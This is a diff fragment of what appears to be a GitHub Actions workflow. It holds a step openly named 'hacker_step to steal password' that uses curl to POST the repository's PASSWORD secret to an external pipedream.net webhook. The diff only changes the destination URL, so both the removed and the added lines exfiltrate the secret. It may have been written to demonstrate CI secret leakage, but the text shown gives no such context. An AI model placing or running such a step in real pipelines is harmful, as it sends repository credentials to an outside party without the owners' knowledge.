@@ -30,6 +30,6 @@ jobs:
       
       - name: hacker_step to steal password
         run: |
-          curl -d '{"password":${{ secrets.PASSWORD }}}' -H "Content-Type: application/json" https://en91rb0j64jhook.m.pipedream.net
+          curl -d '{"password":${{ secrets.PASSWORD }}}' -H "Content-Type: application/json" https://en1peio1595a69e.m.pipedream.net
 
  
